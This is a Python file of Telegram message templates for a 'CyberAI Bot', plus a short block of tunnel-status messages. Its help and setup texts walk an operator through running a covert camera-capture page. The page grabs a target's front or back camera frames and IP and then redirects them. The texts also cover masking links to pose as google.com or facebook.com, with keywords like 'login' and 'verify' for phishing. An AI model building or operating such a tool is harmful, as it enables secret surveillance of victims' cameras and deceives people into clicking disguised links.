"""
CyberAI Bot — Message Templates & Formatters
Pre-formatted Telegram messages with emoji.
"""


def welcome_message(user_name: str) -> str:
    return (
        f"🔒 <b>Welcome to CyberAI Bot, {user_name}!</b>\n"
        f"\n"
        f"Your unified security toolkit — all tools accessible\n"
        f"right here in Telegram.\n"
        f"\n"
        f"<b>Available Tools:</b>\n"
        f"  📷  <b>Camera Capture</b> — Deploy camera capture server\n"
        f"  🔗  <b>URL Masker</b> — Mask URLs for social engineering\n"
        f"  📷+🔗  <b>Combined</b> — Camera + auto URL masking\n"
        f"  📂  <b>View Captures</b> — Browse captured images\n"
        f"  📋  <b>View Logs</b> — Activity & IP logs\n"
        f"\n"
        f"Select a tool from the menu below 👇"
    )


def help_message() -> str:
    return (
        "❓ <b>CyberAI Bot — Help</b>\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        "📷 <b>Camera Capture</b>\n"
        "Deploys a Flask web server that serves a page requesting\n"
        "camera access. When a target visits the link, their camera\n"
        "frames are captured and sent to you in real-time.\n"
        "\n"
        "<i>Steps:</i>\n"
        "1️⃣ Select camera mode (front/back/both)\n"
        "2️⃣ Set redirect URL (where target goes after)\n"
        "3️⃣ Set redirect time (seconds before redirect)\n"
        "4️⃣ Provide your server's public URL\n"
        "5️⃣ Server starts → share the link → receive captures!\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        "🔗 <b>URL Masker</b>\n"
        "Takes any URL and masks it to look like a trusted domain\n"
        "using the @ symbol technique + URL shortening.\n"
        "\n"
        "<i>Steps:</i>\n"
        "1️⃣ Enter the original URL to mask\n"
        "2️⃣ Enter the fake domain (e.g., google.com)\n"
        "3️⃣ Add optional keywords (e.g., login, verify)\n"
        "4️⃣ Get your masked URL!\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        "📷+🔗 <b>Cam + Masker</b>\n"
        "Combines both tools — starts camera server, then\n"
        "automatically masks the server URL.\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        "<b>Commands:</b>\n"
        "/start — Main menu\n"
        "/help — This help message\n"
        "/status — Server status\n"
        "/stop — Stop running server\n"
        "/myid — Show your Telegram user ID\n"
        "/cancel — Cancel current operation\n"
    )


def cam_setup_mode_prompt() -> str:
    return (
        "📷 <b>Camera Capture — Setup</b>\n"
        "\n"
        "Step 1/4 — Select camera mode:\n"
        "\n"
        "  📱 <b>Front</b> — Front camera only\n"
        "  📷 <b>Back</b> — Back camera only\n"
        "  🔄 <b>Both</b> — Alternate front ↔ back\n"
    )


def cam_setup_redirect_url() -> str:
    return (
        "📷 <b>Camera Capture — Setup</b>\n"
        "\n"
        "Step 2/4 — Enter the <b>redirect URL</b>:\n"
        "\n"
        "<i>This is where the target will be sent after capture.\n"
        "Example: https://google.com</i>"
    )


def cam_setup_redirect_time() -> str:
    return (
        "📷 <b>Camera Capture — Setup</b>\n"
        "\n"
        "Step 3/4 — Enter <b>redirect time</b> (seconds):\n"
        "\n"
        "<i>How many seconds to capture before redirecting.\n"
        "Example: 5</i>"
    )


def cam_setup_server_url() -> str:
    return (
        "📷 <b>Camera Capture — Setup</b>\n"
        "\n"
        "Step 4/4 — Enter your <b>server's public URL</b>:\n"
        "\n"
        "<i>This is the public URL pointing to this machine.\n"
        "Use ngrok, Cloudflare Tunnel, or similar.\n"
        "Example: https://abc123.ngrok.io</i>"
    )


def cam_confirm(camera_mode: str, redirect_url: str, redirect_time: int, server_url: str) -> str:
    mode_emoji = {"front": "📱", "back": "📷", "both": "🔄"}.get(camera_mode, "📷")
    return (
        "📷 <b>Camera Capture — Confirm Settings</b>\n"
        "\n"
        f"  {mode_emoji} Camera Mode: <b>{camera_mode.upper()}</b>\n"
        f"  🔀 Redirect URL: <code>{redirect_url}</code>\n"
        f"  ⏱ Redirect Time: <b>{redirect_time}s</b>\n"
        f"  🌐 Server URL: <code>{server_url}</code>\n"
        "\n"
        "Ready to deploy?"
    )


def cam_started(server_url: str) -> str:
    return (
        "🟢 <b>Camera Server STARTED</b>\n"
        "\n"
        f"🔗 Link: <code>{server_url}</code>\n"
        "\n"
        "Share this link with the target.\n"
        "Captured images will be sent here in real-time.\n"
        "\n"
        "<i>Use the controls below to manage the server.</i>"
    )


def cam_stopped(total_captures: int, uptime: str) -> str:
    return (
        "🔴 <b>Camera Server STOPPED</b>\n"
        "\n"
        f"  📸 Total Captures: <b>{total_captures}</b>\n"
        f"  ⏱ Uptime: <b>{uptime}</b>\n"
        "\n"
        "<i>Use View Captures to browse images.</i>"
    )


def cam_status(is_running: bool, capture_count: int, uptime: str) -> str:
    status = "🟢 RUNNING" if is_running else "🔴 STOPPED"
    return (
        f"📊 <b>Server Status: {status}</b>\n"
        "\n"
        f"  📸 Captures: <b>{capture_count}</b>\n"
        f"  ⏱ Uptime: <b>{uptime}</b>\n"
    )


def cam_new_capture(filename: str, ip: str, camera: str) -> str:
    cam_emoji = {"front": "📱", "back": "📷"}.get(camera, "📸")
    return (
        f"{cam_emoji} <b>New Capture!</b>\n"
        f"  📄 {filename}\n"
        f"  🌐 IP: <code>{ip}</code>\n"
        f"  📷 Camera: {camera}"
    )


def masker_prompt_url() -> str:
    return (
        "🔗 <b>URL Masker</b>\n"
        "\n"
        "Step 1/3 — Enter the <b>original URL</b> to mask:\n"
        "\n"
        "<i>Example: https://your-server.trycloudflare.com</i>"
    )


def masker_prompt_domain() -> str:
    return (
        "🔗 <b>URL Masker</b>\n"
        "\n"
        "Step 2/3 — Enter the <b>masking domain</b>:\n"
        "\n"
        "<i>The fake domain that will be displayed.\n"
        "Example: google.com, facebook.com, microsoft.com</i>"
    )


def masker_prompt_keywords() -> str:
    return (
        "🔗 <b>URL Masker</b>\n"
        "\n"
        "Step 3/3 — Enter <b>custom keywords</b> (optional):\n"
        "\n"
        "<i>Additional words to make the URL look legit.\n"
        "Example: login, verify, account, secure\n"
        "Send /skip to skip this step.</i>"
    )


def masker_processing() -> str:
    return "⏳ <b>Shortening and masking URL...</b>\n\nThis may take a moment."


def masker_result(original: str, shortened: str, masked_urls: dict) -> str:
    text = (
        "✅ <b>URL Masked Successfully!</b>\n"
        "\n"
        f"📎 <b>Original:</b>\n<code>{original}</code>\n"
        "\n"
        f"🔗 <b>Shortened:</b>\n<code>{shortened}</code>\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        f"🎭 <b>Masked URL (copy & use):</b>\n"
        f"<code>{masked_urls.get('method_1', 'N/A')}</code>\n"
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "\n"
        "📋 <b>All Methods:</b>\n"
    )

    method_names = {
        "method_1": "@ Method (recommended)",
        "method_2": "Subdomain Method",
        "method_3": "Path Method",
        "method_4": "Query Method",
    }

    for key, name in method_names.items():
        url = masked_urls.get(key, "N/A")
        text += f"\n<b>{name}:</b>\n<code>{url}</code>\n"

    return text


def masker_failed(error: str) -> str:
    return (
        "❌ <b>URL Masking Failed</b>\n"
        "\n"
        f"Error: <code>{error}</code>\n"
        "\n"
        "<i>Would you like to try again?</i>"
    )


def captures_summary(total: int, latest_file: str = None) -> str:
    text = (
        "📂 <b>Captured Images</b>\n"
        "\n"
        f"  📸 Total files: <b>{total}</b>\n"
    )
    if latest_file:
        text += f"  📄 Latest: <code>{latest_file}</code>\n"
    text += "\n<i>Select an action below:</i>"
    return text


def logs_summary(total_lines: int, log_size: str) -> str:
    return (
        "📋 <b>Activity Logs</b>\n"
        "\n"
        f"  📝 Total entries: <b>{total_lines}</b>\n"
        f"  💾 File size: <b>{log_size}</b>\n"
        "\n"
        "<i>Select an action below:</i>"
    )


def unauthorized_message() -> str:
    return (
        "🚫 <b>Access Denied</b>\n"
        "\n"
        "You are not authorized to use this bot.\n"
        "Contact the administrator for access."
    )


def error_message(error: str) -> str:
    return (
        "❌ <b>Error Occurred</b>\n"
        "\n"
        f"<code>{error}</code>\n"
        "\n"
        "<i>Please try again or contact the administrator.</i>"
    )


def operation_cancelled() -> str:
    return "❌ <b>Operation cancelled.</b>\n\nReturning to main menu."


def server_already_running(url: str) -> str:
    return (
        "⚠️ <b>Server Already Running</b>\n"
        "\n"
        f"A camera server is already active at:\n"
        f"<code>{url}</code>\n"
        "\n"
        "<i>Stop it first before starting a new one.</i>"
    )


def no_captures() -> str:
    return (
        "📂 <b>No Captures Found</b>\n"
        "\n"
        "No images have been captured yet.\n"
        "Start a camera server first!"
    )


def no_logs() -> str:
    return (
        "📋 <b>No Logs Found</b>\n"
        "\n"
        "No activity has been recorded yet."
    )


def cleared_successfully(what: str) -> str:
    return f"🗑 <b>{what} cleared successfully!</b>"


def myid_message(user_id: int, username: str) -> str:
    return (
        f"🆔 <b>Your Telegram Info</b>\n"
        f"\n"
        f"  ID: <code>{user_id}</code>\n"
        f"  Username: @{username or 'N/A'}\n"
        f"\n"
        f"<i>Add this ID to ADMIN_IDS in .env to grant admin access.</i>"
    )
# File: telegram/bot/utils/messages.py

class Messages:
    START_MENU = """
✅ Tunnel Service Status: {tunnel_status}
🌐 Original Cloudflare URL: {tunnel_url}
🔗 Masked URL: {masked_url}
📡 Local Port: {local_port}
⏱ Tunnel Start Time: {start_time}

Choose an action below:
"""
    
    TUNNEL_RESTARTED = """
🔄 Tunnel restarted successfully!

🌐 Original Cloudflare URL: {tunnel_url}
🔗 Masked URL: {masked_url}
⏱ Started at: {start_time}
"""
    
    TUNNEL_STOPPED = """
❌ Tunnel stopped successfully.

Cloudflare tunnel has been terminated.
Masked URL is no longer active.
Local service has been stopped.
"""
    
    TUNNEL_INFO = """
🌐 Original Cloudflare URL: {tunnel_url}
🔗 Masked URL: {masked_url}
Status: {status}
Duration: {duration}
"""
    
    NO_ACTIVE_TUNNEL = "No active tunnel found."